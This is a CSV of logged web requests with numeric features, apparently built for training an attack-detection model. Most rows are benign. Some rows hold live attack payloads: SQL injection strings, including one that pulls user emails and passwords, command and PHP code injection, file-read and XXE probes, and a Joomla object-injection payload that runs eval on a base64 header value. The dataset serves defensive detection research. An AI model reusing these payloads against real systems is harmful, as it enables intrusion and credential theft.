col_0,col_1,col_2,col_3,col_4,col_5,col_6,col_7,id,meta2,vector,meta3,meta6,meta4,meta5,len_vec,hostname,vector_letters,vector_digits,vector_non_letters,vector_entropy,hostname_letters,hostname_digits,hostname_non_letters,hostname_entropy,meta2_letters,meta2_digits,meta2_non_letters,meta2_entropy,len_meta2,vector_0,vector_1,vector_2,hostname_0,hostname_1,hostname_2,meta2_0,meta2_1,meta2_2
1,2,0,1,0,0,1,3,0de3a7be542a29a14c2294465b6df099,REQUEST_POST_ARGS.%%Nonce,28b57c3d2747c9b52f8dda8da94e3294,400,188.6.165.219,7913,"mozilla/5.0 (linux; android 6.0.1; sm-n910c build/mmb29k) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.137 mobile safari/537.36",32,dslbc06a5db.fixip.t-online.hu,12,20,20,3.5931390622295662,22,3,7,4.254195650150781,20,0,5,4.053660689688185,25,0.03818795830011368,-0.009683425538241863,-0.08708322048187256,-0.04288414493203163,0.009764904156327248,0.004409710876643658,0.005204252898693085,0.024234266951680183,0.030656903982162476
2,0,0,1,1,0,1,3,66ce74942e5f471c055859d4fbd7df37,REQUEST_GET_ARGS._,1516412311189,404,77.245.174.84,762,"mozilla/5.0 (iphone; cpu iphone os 11_2_2 like mac os x) applewebkit/604.1.34 (khtml, like gecko) crios/63.0.3239.73 mobile/15c202 safari/604.1",13,77-245-174-084.mynts.ru,0,13,13,2.5073801024236357,7,11,16,3.8164027166443875,14,0,4,3.197159723424149,18,0.0,0.0,0.0,0.05938822031021118,0.02048906311392784,0.06041295826435089,0.0034901301842182875,-0.02908659540116787,-0.03711789473891258
2,1,0,0,1,1,0,3,05cabb0c738ba0592d7a17ac7afd1a9f,REQUEST_HEADERS.X-Forwarded-For,192.168.10.200,200,94.125.52.153,970,"mozilla/5.0 (windows nt 6.3; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/60.0.3112.113 safari/537.36",14,mail.xocka.ru,0,11,14,2.6455933144511468,11,0,2,3.3927474104487847,27,0,4,4.155651552252569,31,0.0,0.0,0.0,0.07066618651151657,-0.017904743552207947,0.038184572011232376,-0.04338948801159859,0.03844974562525749,-0.03441692888736725
1,2,0,0,0,1,2,2,0da828e904206a040fcda6c20826d4d7,,"\""1511a83467ec7cc94e550411ad8e4c192f807795c43a8eb42ac6b4cbdb2cabfba96ef4f8257ce379501378ed4774f6fb\""\""\""",206,78.85.4.17,525,mozilla/5.0 (linux; android 6.0.1; ru-ru; sm-t705 build/mmb29k.t705xxu1cpl1) mxplayer/1.9.17,104,d17.sub4.net78.udm.net,38,58,66,4.0812964505053575,13,5,9,3.550340709546388,0,0,0,0.0,0,-0.011188634671270847,0.017938358709216118,-0.04041467607021332,0.018913041800260544,0.02862398326396942,0.054754212498664856,0.0,0.0,0.0
1,0,2,0,1,0,1,3,84803b9d4ad0b7570aadb195113b4eb3,,/.svn,404,185.5.140.253,284,"mozilla/5.0 (windows nt 6.1) applewebkit/537.36 (khtml, like gecko) chrome/28.0.1468.0 safari/537.36",5,140.5.185.253.static.ural.ru,3,0,2,2.321928094887362,12,10,16,3.726474118254376,0,0,0,0.0,0,0.1179165467619896,0.09136928617954254,0.08583573251962662,0.07503212243318558,-0.035762786865234375,0.014902942813932896,0.0,0.0,0.0
2,1,1,0,1,0,0,3,bb8089a86892462e15f9810674d8fd2b,X-Requested-With\';\'CSRF_TOKEN,post\';\'xmlhttprequest\';\'150ee395fb90b88bcb49117a16a43665cb2bcc5e9d421fc987dff70babc2ca0cb2bf2e13f58e8412,403,66.249.88.35,1025,"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/52.0.2743.116 safari/537.36 edge/15.15063",108,google-proxy-66-249-88-35.google.com,53,45,55,4.600856170717775,20,9,16,3.916607904809985,23,0,8,4.478232197413861,31,-0.031322214752435684,0.04721938818693161,0.032405320554971695,0.09275691211223602,-0.017967088147997856,0.0544140599668026,-0.010499680414795876,0.020576322451233864,-0.07098639756441116
1,1,0,1,0,1,2,2,f58627e21967db350ec60ac6448e6d1e,,"
--boundaryemae
content-disposition: form-data; name=""data""; filename=""c:\users\nataliaakhmedova\appdata\local\temp\66\v8_8803_28e53.was""
content-type: application/x-zip-compressed


delete from sc_tagged_objects where tag_id not in('18') and object_id='3922'",200,185.70.104.11,968,mozilla/4.0 (compatible; win32; winhttp.winhttprequest.5),259,Empty,184,17,75,4.964555389436014,5,0,0,2.321928094887362,0,0,0,0.0,0,0.003846663050353527,-0.015330065973103046,-0.027452733367681503,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,0,0,0,0,1,2,4,66015cb116e78d2a9619c08d29e5d2c1,from,../../../microphone.ru/www/img/mics/digico_mod_d_rack_dac.jpg,500,90.156.197.72,173,,61,Empty,42,0,19,4.010484421009326,5,0,0,2.321928094887362,4,0,0,2.0,4,0.010953513905405998,0.025301437824964523,0.012037870474159718,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.06153596565127373,-0.03312695398926735,-0.0899478867650032
1,2,0,1,0,0,0,4,121251f795d2718bd6c7a5b1968a5af0,REQUEST_COOKIES.LtpaToken2,ofpb5hprxwcyzjchhrz78lbw60tz5ofxcjyr1t7dymlvym ix53kdrc9tywyg7bddie/y9f1ko/jidwdcq5utkkihni5olx/exgh79acmrhwpbi1edpallt9ebayjbhpjnefx0gqwhinqtr0ikigmmkcdw9we9k rzmlie6kpfv2ktbs9m1d3w2yku7e/0j3tmfbieosesjd/5 ojkzot26rtppsv9ub8lcabiy8h5nuzb2ymu4zbywcqdumzvurq7tmh/ts/itdcmnaaxoywtyjyksyqwtcjrzlp myjkg2yljakrmx4wo2bfvssdv5thh/pja5wsswu ts/olglydolwgczveud pfexmyde/1v3x9lavz5rvtuxg3gytwcwl0y2ksntfrsmnxkf/ tf jnelv0za3j9cpm767bo5oeoha5jrough5uskhusjryb45zaacyyks4ygy2swytjzjak7jwpwx7vhwvxbmih ncskihgd0o/8isvw6cvzo z6perxkaljhonbth0tj9g9migr2/7guiq5s4r0sfmrzi1dqrbjzdrt4g8g8weaykj4rpxvovwl/ahy2qayilvcnjdt9dngtqy bnwnex1llcc2up2  uentqhpgay/q,404,84.53.198.102,1490,"mozilla/5.0 (windows nt 6.1; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/63.0.3239.132 safari/537.36",640,84-53-198-102.elcom.ru,520,92,120,5.143689776103607,7,10,15,3.970573095811684,23,1,3,4.286790198827112,26,-0.0038511904422193766,-0.0005352093721739948,-0.010984905064105988,0.04734693467617035,-0.045375604182481766,0.053232401609420776,-0.02694849669933319,-0.0046944948844611645,-0.011222771368920803
0,1,1,1,1,0,1,3,e5e41f4e8f75452cef5fa13887e78a3e,id,"21954 or 1=999999.9 /**/union/**/all /**/select 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39--",200,190.32.101.116,869,mozilla/5.0 (windows; u; windows nt 5.1; pt-pt; rv:1.9.1.2) gecko/20090729 firefox/3.5.2 (.net clr 3.5.30729),184,Empty,26,133,158,3.683918411014562,5,0,0,2.321928094887362,2,0,0,1.0,2,-0.051601655781269073,0.06578852981328964,0.015949435532093048,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.046362847089767456,0.11150801181793213,0.025058668106794357
1,1,0,0,0,1,2,3,0bce3849ead8521394088d6599bf468b,pll_language,file:///windows/win.ini,200,83.217.200.78,375,arachni/v1.4,23,Empty,17,0,6,3.257500413502068,5,0,0,2.321928094887362,11,0,1,2.8553885422075336,12,-0.016491563990712166,0.057480353862047195,0.022303542122244835,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.051660798490047455,-0.05472293496131897,0.07352294027805328
1,2,0,0,2,1,0,2,d4d991a7b5cd8e093506e84fd9f8b68a,REQUEST_HEADERS.Forwarded,for=217.107.115.253,404,66.102.9.54,1029,"mozilla/5.0 (linux; android 7.1.1; zc553kl build/nmf26f) applewebkit/537.36 (khtml, like gecko) chrome/63.0.3239.111 mobile safari/537.36",19,google-proxy-66-102-9-54.google.com,3,12,16,3.260828171224455,20,8,15,3.897299717551715,23,0,2,4.003856189774724,25,-0.01613723672926426,0.10498104989528656,-0.0075935423374176025,0.09275691211223602,-0.017967088147997856,0.0544140599668026,-0.030896037817001343,0.00118316023144871,-0.03605054318904877
2,0,0,0,1,1,1,3,6572f130448e4a8821b542907127ad96,RESPONSE_HEADERS.Age,3246,200,185.26.112.50,694,"mozilla/5.0 (windows nt 6.1; wow64) applewebkit/538.1 (khtml, like gecko) phantomjs/2.1.1 safari/538.1",4,Empty,0,4,4,2.0,5,0,0,2.321928094887362,18,0,2,3.4841837197791885,20,0.0,0.0,0.0,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.010616776533424854,-0.04048685356974602,0.028156384825706482
3,0,0,2,0,0,0,3,6547add555dc5f9c40fbc43bdf2c041f,Referer,file://localhost/mtd_down/widgets/user/nstreamlmod/index.html?country=ru&language=12&lang=de&modelid=valencia_moip&server=operation&remocon=0_650_259_0&area=paneuro&product=0&mgrver=2.403,200,77.3.107.33,527,mozilla/5.0 (windows; u; en-us; rv:1.8.1.11; gecko/20071129; firefox/2.5.0) maple 5.1.00266 navi,187,dynamic-077-003-107-033.77.3.pool.telefonica.de,139,15,48,4.726342814143577,23,15,24,4.015467651089608,7,0,0,1.8423709931771084,7,0.011467690579593182,-0.013554978184401989,-0.014851349405944347,0.025073427706956863,-0.016923055052757263,-0.030382206663489342,0.040736131370067596,-0.020673541352152824,0.015498594380915165
3,1,1,0,1,0,1,1,4a651d6c8adc64b67b11497203439f71,url,http://www.yoga4mums.com/sitemap3.html,302,164.132.161.47,297,mozilla/5.0 (compatible; ahrefsbot/5.1; +http://ahrefs.com/robot/),38,hydrogen145.a.ahrefs.com,29,2,9,4.093340592892869,18,3,6,3.9701755214643453,3,0,0,1.584962500721156,3,-0.009912116453051567,0.0753052681684494,-0.0074996342882514,0.026259465143084526,0.05401894450187683,-0.007906351238489151,0.017424333840608597,0.00937733892351389,0.02128124237060547
1,2,0,1,1,0,1,2,0e44ebeeffb567ab399e0e86223a5b2d,src,../upload/image/catalog/registratory/ctv-hd7004.jpg,502,217.66.158.142,714,"mozilla/5.0 (linux; android 4.2.2; zp998 build/jdq39) applewebkit/537.36 (khtml, like gecko) chrome/53.0.2785.124 mobile safari/537.36",51,host-142-158-66-217.spbmts.ru,38,4,13,4.349210764415339,12,11,17,3.9783335811852645,3,0,0,1.584962500721156,3,0.010398611426353455,0.02868390455842018,-0.002604513196274638,0.06425502151250839,-0.038102567195892334,0.016810627654194832,0.04109525680541992,-0.03798994421958923,-0.10623877495527267
1,1,0,1,0,1,2,2,ab0305dc02bd150e7aa77e8b8440fccf,"\"")/**/and/**/sleep(7)=\""\""\""","\"")/**/and/**/sleep(7)=\""\""\""",403,95.143.118.242,236,python-requests/2.6.0 cpython/2.7.5 linux/3.10.0-693.2.2.el7.x86_64,29,Empty,8,1,21,3.616601684782745,5,0,0,2.321928094887362,8,1,21,3.616601684782745,29,0.08454073220491409,0.027041271328926086,-0.03886851668357849,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.04692130535840988,0.03085451014339924,-0.029434144496917725
1,2,0,1,1,0,0,3,7e4b911aca4bbb48d623872e653560bf,Referer,file://localhost/mtd_down/widgets/user/lmod_by/index.html?country=ua&language=65&lang=uk&modelid=genoa_yahoo&server=operation&remocon=0_650_259_13&area=paneuro&product=0&mgrver=3.745,200,188.163.83.32,473,mozilla/5.0 (windows; u; en-us; rv:1.8.1.11; gecko/20071129; firefox/2.5.0) maple 6.0.00067 navi,182,188-163-83-32.broadband.kyivstar.net,132,16,50,4.830951550428381,20,10,16,4.17619062614183,7,0,0,1.8423709931771084,7,-0.0066952393390238285,-0.01280040480196476,-0.02683170884847641,0.008979163132607937,0.03570941463112831,0.036089129745960236,0.040736131370067596,-0.020673541352152824,0.015498594380915165
1,0,0,0,0,2,2,3,011ab0f5398d9a44e7cc4b21b42c09da,src,../images/1010.png,200,193.178.131.1,541,mozilla/5.0 (windows nt 6.1; wow64; trident/7.0; rv:11.0) like gecko,18,mail.sogaz.ru,9,4,9,3.4613201402110083,11,0,2,3.3927474104487847,3,0,0,1.584962500721156,3,0.027766406536102295,-0.08217114210128784,0.03890559822320938,0.07663402706384659,0.011497396044433117,0.07231614738702774,0.04109525680541992,-0.03798994421958923,-0.10623877495527267
2,1,0,1,0,1,0,3,c95a13caaf009f050dcb51183e35bb3d,,post\';\'multipart/form-data; boundary=----webkitformboundarybsydhdrbs0mdfgzj\';\',404,178.46.176.163,32021,"mozilla/5.0 (windows nt 6.1; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/58.0.3029.110 safari/537.36",82,178-46-176-163.static-adsl.isurgut.ru,62,1,20,4.615574079110094,19,11,18,4.0059580950078475,0,0,0,0.0,0,0.015721162781119347,-0.011962677352130413,-0.05549589917063713,0.03453695401549339,-0.010193828493356705,0.03583844378590584,0.0,0.0,0.0
0,1,2,0,2,1,1,1,b13c1d03356503ee7775f22e310c4886,goto,file:///g:/!%d0%a1%d0%b0%d0%b9%d1%82/7_%d0%91%d0%b8%d0%b1%d0%bb%d0%b8%d0%be%d1%82%d0%b5%d0%ba%d0%b0/%d0%a2%d0%b0%d1%83%d0%bd%d1%81%d0%b5%d0%bd%d0%b4/%d0%a2%d0%b0%d1%83%d0%bd%d1%81%d0%b5%d0%bd%d0%b4.docx#_ftn4,200,157.55.39.41,632,mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),208,msnbot-157-55-39-41.search.msn.com,72,62,136,3.469680332134878,18,9,16,4.057476076289931,4,0,0,1.5,4,0.011656416580080986,-0.04747030884027481,-0.009814356453716755,0.05570661276578903,0.011945171281695366,0.031013179570436478,0.02966228313744068,0.12006361037492752,-0.0962439775466919
1,1,1,0,0,0,2,3,ecc4b4dbaaaf1f5de00dd9c8960f00fe,action,verificationcode;vid=post;rand=451f4dd9ca881479c77216b6ec853402,200,188.32.215.221,474,mozilla/4.0 (compatible; msie 7.0; windows nt),63,broadband-188-32-215-221.ip.moscow.rt.ru,36,23,27,4.552698876486353,21,11,19,4.165311532225101,6,0,0,2.584962500721156,6,0.003953596111387014,0.08236842602491379,-0.03592991828918457,0.08563149720430374,-0.022181833162903786,-0.019320309162139893,0.06644271314144135,-0.08328638225793839,-0.030450109392404556
2,0,1,0,0,0,2,3,6561104736dc5badf95c5aedb7ba54eb,src,../images/catalog/goods/47/1.jpg,302,87.117.15.18,587,"mozilla/5.0 (windows nt 6.3; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/53.0.2785.116 safari/537.36",32,18.15.117.87.donpac.ru,21,3,11,3.878928031846024,8,9,14,3.386266142526532,3,0,0,1.584962500721156,3,0.05136776342988014,0.04166344553232193,0.037932418286800385,0.08035826683044434,0.012465405277907848,-0.006383921951055527,0.04109525680541992,-0.03798994421958923,-0.10623877495527267
2,1,2,0,0,0,1,2,0d57fdb9072051dbdd0324e5e1a85b60,link,http://hh.ru/vacancy/7035716,302,163.172.66.24,295,mozilla/5.0 (compatible; ahrefsbot/5.1; +http://ahrefs.com/robot/),28,oxygen239.a.ahrefs.com,15,7,13,4.066108939837481,16,3,6,3.9705730958116843,4,0,0,2.0,4,0.005622205324470997,0.03586895018815994,0.042886942625045776,0.03534764051437378,0.07750922441482544,-0.002347982255741954,0.03822052851319313,0.040934279561042786,0.05807957425713539
0,1,0,0,1,2,1,3,ec4c66084fd3b4ae4ea63d8819c3e6e7,REQUEST_GET_ARGS._,1516544657592,404,83.60.229.184,927,mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0,13,184.red-83-60-229.dynamicip.rima-tde.net,0,13,13,2.623516641218015,22,10,18,4.215311532225102,14,0,4,3.197159723424149,18,0.0,0.0,0.0,0.002418189076706767,0.001843155943788588,0.04364996403455734,0.0034901301842182875,-0.02908659540116787,-0.03711789473891258
2,0,1,0,0,0,0,5,2aea06665b98417c206efdc53a2d510d,,/alpha/.git/head,301,195.22.127.231,508,"mozilla/5.0 (windows nt 6.3; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.167 safari/537.36",16,Empty,12,0,4,3.2806390622295662,5,0,0,2.321928094887362,0,0,0,0.0,0,0.04632210358977318,0.0614871047437191,-0.012476537376642227,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,1,0,1,1,0,1,3,07456f3017c938721c474e618df1ceda,id,"66"");print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52));exit;/*",200,77.221.130.13,341,""");print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52));exit;/*",100,77.221.130.13.addr.datapoint.ru,39,23,61,4.052711364394161,15,10,16,3.671149939070186,2,0,0,1.0,2,-0.0722041055560112,-0.009172332473099232,0.1193758025765419,0.018468255177140236,0.008682062849402428,-0.002067777095362544,0.046362847089767456,0.11150801181793213,0.025058668106794357
2,3,1,0,0,0,1,1,d3d7934bec48371761a3ca0330f90098,REQUEST_HEADERS.User-Agent,"mozilla/5.0 (linux; android 5.0.1; lg-h340 build/lrx21y) applewebkit/537.36 (khtml, like gecko) chrome/61.0.3163.98 mobile safari/537.36",404,83.220.236.151,1065,"mozilla/5.0 (linux; android 5.0.1; lg-h340 build/lrx21y) applewebkit/537.36 (khtml, like gecko) chrome/61.0.3163.98 mobile safari/537.36",136,Empty,74,29,62,4.98089170635285,5,0,0,2.321928094887362,23,0,3,4.008132025833399,26,-0.0008613633690401912,0.004560231696814299,-0.0034563327208161354,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.00619670283049345,-0.017514320090413094,-0.015246444381773472
1,1,0,1,1,0,1,3,743d4437206a07e1acd303c2388ba2b3,id,"20"");ls -la;factor 228000;/*",302,77.221.130.13,146,""");ls -la;factor 228000;/*",28,77.221.130.13.addr.datapoint.ru,10,8,18,3.967720100474499,15,10,16,3.671149939070186,2,0,0,1.0,2,0.037229590117931366,0.04713113233447075,0.04791224002838135,0.018468255177140236,0.008682062849402428,-0.002067777095362544,0.046362847089767456,0.11150801181793213,0.025058668106794357
1,2,0,0,0,1,2,2,6ec1f30083f89c6d1d4699e04a689a1f,,"\""1511a837812df2b24e550411ad8e4c196cf00af9f8d2ddffa13c656a4761b97d0cd3edeefccc2b2d876526a991aff175\""\""\""",206,78.85.4.17,526,mozilla/5.0 (linux; android 6.0.1; ru-ru; sm-t705 build/mmb29k.t705xxu1cpl1) mxplayer/1.9.17,104,d17.sub4.net78.udm.net,40,56,64,4.075105697901577,13,5,9,3.550340709546388,0,0,0,0.0,0,-0.035400621592998505,0.002305460162460804,-0.013607754372060299,0.018913041800260544,0.02862398326396942,0.054754212498664856,0.0,0.0,0.0
2,1,0,0,0,1,1,3,1bf3e505db273529fbd95785d72fe75d,src,../userfiles/image/realty/537560_2.jpg,200,91.195.205.121,469,mozilla/5.0 (windows nt 5.1; rv:49.0) gecko/20100101 firefox/49.0,38,Empty,23,7,15,4.333325210755073,5,0,0,2.321928094887362,3,0,0,1.584962500721156,3,0.03963007032871246,0.018947705626487732,0.017960045486688614,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.04109525680541992,-0.03798994421958923,-0.10623877495527267
3,1,0,0,1,0,2,1,065475047feaf462db2e6d1a30eb43b9,?äa7hé¾Ë?T¹¼³ò?_?tY!<õê#_?þÙÔ?ç¿þC?ÿ,?äa7hé¾ë?t¹¼³ò?_?ty!<õê#_?þùô?ç¿þc?ÿ,502,188.43.52.163,142269,curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 openssl/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3,41,Empty,18,3,23,4.683125554510687,5,0,0,2.321928094887362,18,3,23,4.731906042315565,41,0.05500180646777153,-0.049428243190050125,-0.020433494821190834,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.017536625266075134,-0.03739539161324501,0.0013608826557174325
1,0,0,0,1,1,1,4,b030cc6d665e9297fb5a128987267dde,REQUEST_COOKIES.User-cn,?????? ???????,404,194.186.13.126,1596,mozilla/5.0 (windows nt 6.1; wow64; trident/7.0; rv:11.0) like gecko,14,Empty,0,0,14,0.37123232664087563,5,0,0,2.321928094887362,20,0,3,4.0559581516151235,23,0.0,0.0,0.0,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.0068269334733486176,-0.06276649981737137,-0.013647159561514854
1,0,0,0,0,2,1,4,c11f189771969eab415af190f6b01d70,action,verificationcode;vid=pm;rand=95224e4edbf070bd5547f0fb60efb5ec,200,79.173.93.228,554,"mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/48.0.2564.116 safari/537.36",61,Empty,40,17,21,4.320264698914895,5,0,0,2.321928094887362,6,0,0,2.584962500721156,6,0.010009875521063805,0.037892915308475494,-0.019870754331350327,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.06644271314144135,-0.08328638225793839,-0.030450109392404556
1,1,1,1,0,1,1,2,d878839a44e0cbbeb481b5ff017403b9,action,verificationcode;vid=register;rand=721e0005565723f37ad5581584ed8128,200,96.9.223.203,525,mozilla/5.0 (x11; ubuntu; linux i686; rv:34.0) gecko/20100101 firefox/34.0,67,unassigned.relandergroup.com,37,26,30,4.394249362572028,26,0,2,3.7979026896829464,6,0,0,2.584962500721156,6,-0.0011250674724578857,0.034379471093416214,-0.02974466048181057,0.02553156018257141,0.027420366182923317,-0.022015610709786415,0.06644271314144135,-0.08328638225793839,-0.030450109392404556
1,1,0,0,1,2,0,3,24136b2cc4016e3721c917d5517d69a0,pwd,hunter,200,111.88.129.131,456,mozilla/5.0 (windows nt 6.1; wow64; rv:40.0) gecko/20100101 firefox/40.1,6,wtl.worldcall.net.pk,6,0,0,2.584962500721156,17,0,3,3.484183719779189,3,0,0,1.584962500721156,3,-0.009495804086327553,0.017999885603785515,-0.0017832325538620353,-0.04139161482453346,0.029298532754182816,0.014386341907083988,-0.008016509935259819,0.03202420100569725,0.03764567896723747
0,3,0,1,0,0,0,4,c9739bd483f84c78b357c4f57e91b608,,post\';\'multipart/form-data; boundary=8a29d242d27eb\';\',403,176.120.38.254,1620,"mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/56.0.2924.87 yabrowser/17.3.1.840 yowser/2.5 safari/537.36",57,Empty,34,8,23,4.536849610990577,5,0,0,2.321928094887362,0,0,0,0.0,0,0.005093428771942854,-0.02390424907207489,-0.018503382802009583,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,0,0,2,0,1,0,4,abf1f2147575b6853a979bf96ebc9322,reference to,http://vxxyazaa.a.wlrm.tl/a.dtd,405,139.162.191.89,405,mozilla/5.0 (windows nt 6.3; wow64; trident/7.0; rv:11.0) like gecko,31,li1508-89.members.linode.com,23,0,8,3.7166308917868656,18,6,10,4.012188403968661,11,0,1,2.751629167387823,12,0.044635143131017685,0.009068416431546211,0.012680305168032646,0.09160509705543518,0.03637372702360153,0.018179066479206085,-0.061886005103588104,-0.07326909154653549,0.005927756428718567
1,1,0,1,0,1,2,2,c35df213636bf7a84f011d443fbb529c,,"
--boundaryemae
content-disposition: form-data; name=""data""; filename=""c:\users\nataliaakhmedova\appdata\local\temp\66\v8_8803_fe19.was""
content-type: application/x-zip-compressed


delete from sc_tagged_objects where tag_id not in('13','39') and object_id='1910'",200,185.70.104.11,972,mozilla/4.0 (compatible; win32; winhttp.winhttprequest.5),263,Empty,185,17,78,4.980235965806449,5,0,0,2.321928094887362,0,0,0,0.0,0,-0.002961821388453245,-0.011987064965069294,-0.028163880109786987,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,0,0,0,1,1,1,4,121613a58aa1b422fc3023910e92eb9a,REQUEST_COOKIES.LtpaToken2,y9r llrsyv4txm5gopvimetee0xorlmqjca1wilqdhunkk6eysyhvujrtdi2c8wrz tqlmyot971c2is7bb26sjadvon80g59w/ozxvu4u asvjlw7gf3fubxm4w2spklxlql4glxp2mmv4ewat2yihcrgi2lgbwdl82ty51wfkskjmhk4tvqls7lvdarjx3l/t5ml5kilh/9xnrq6uuyszmqc3chmq4thgb21x3k9mnqcpkzwgzvfoxi68vnch2nkw2ijtfenf34a84sm2py07tvfskknxtuonqok6ybjzs qydxyg06lwrfwusdqoceu3qt9npeiq6limaq38wq1jrigsgb3/gem2ooerl/cpzjxpga/je2sdneknfk8329frcirfdr2hkyqsuxvu6z5i7mqe9y9jd1xgoaa9elxrzgl6hvsudbd2apsfftpancw2/wcclzblp/ulx8hst9n tkc3tsk svynodv/83yn7e9jvs/a1wtogvo6kotqaxuwzopdkrz7nfwatsoz57aikejhlivoe wt6qvshhmpfydn9x2dz6w/3ljggsx2ruhyxcwrx9p8g9pqxrmrebtahxm fyyte4/j2byevbpcglezamrhu//jn/tm6kde/,404,77.235.211.90,1566,"mozilla/5.0 (windows nt 6.1; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/63.0.3239.132 safari/537.36",640,90.210.tomsk.ptl.ru,508,108,132,5.161461393834313,10,5,9,3.6163485660751626,23,1,3,4.286790198827112,26,-0.0016696342499926686,-0.013241859152913094,0.005920808296650648,0.0243468526750803,0.023748056963086128,0.05922618508338928,-0.02694849669933319,-0.0046944948844611645,-0.011222771368920803
1,0,1,0,1,0,1,4,c43677269a1572ccb1eb350384b6037f,cat,"1 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(hex(cast(cc_users.user_email as char))),0x5e,unhex(hex(cast(cc_users.user_password as char))),0x27,0x7e) from `u10019`.cc_users limit 127534,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1",200,188.191.21.201,697,mozilla/4.0 (compatible; msie 7.0; windows nt 5.1; sv1; .net clr 2.0.50727),353,Empty,231,32,122,4.771070045866547,5,0,0,2.321928094887362,3,0,0,1.584962500721156,3,-0.01387435756623745,0.00964306015521288,-0.017342884093523026,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.09840408712625504,-0.07091053575277328,0.00418731989338994
1,1,1,0,0,1,0,4,f653019f0be5bbe8b1dbd18e408c6e50,X-Forwarded-For,"ekurl}__yvqltehaqe|o:21:""jdatabasedrivermysqli"":3:{s:4:""\0\0\0a"";o:17:""jsimplepiefactory"":0:{}s:21:""\0\0\0disconnecthandlers"";a:1:{i:0;a:2:{i:0;o:9:""simplepie"":5:{s:8:""sanitize"";o:20:""jdatabasedrivermysql"":0:{}s:5:""cache"";b:1;s:19:""cache_name_function"";s:6:""assert"";s:10:""javascript"";i:9999;s:8:""feed_url"";s:69:""eval(base64_decode($_server['http_cmd']));jfactory::getconfig();exit;"";}i:1;s:4:""init"";}}s:13:""\0\0\0connection"";i:1;}ðýýý, 173.254.216.66",200,173.254.216.66,795,"mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/44.0.2403.125 safari/537.36",450,unassigned.quadranet.com,243,60,207,5.067638207593937,22,0,2,3.772055208874201,13,0,2,3.0565647621309537,15,0.02789083682000637,-0.001049476326443255,-0.011691207997500896,0.0252618957310915,0.03931974247097969,-0.014300145208835602,-0.050517141819000244,0.08437912166118622,-0.0401972234249115
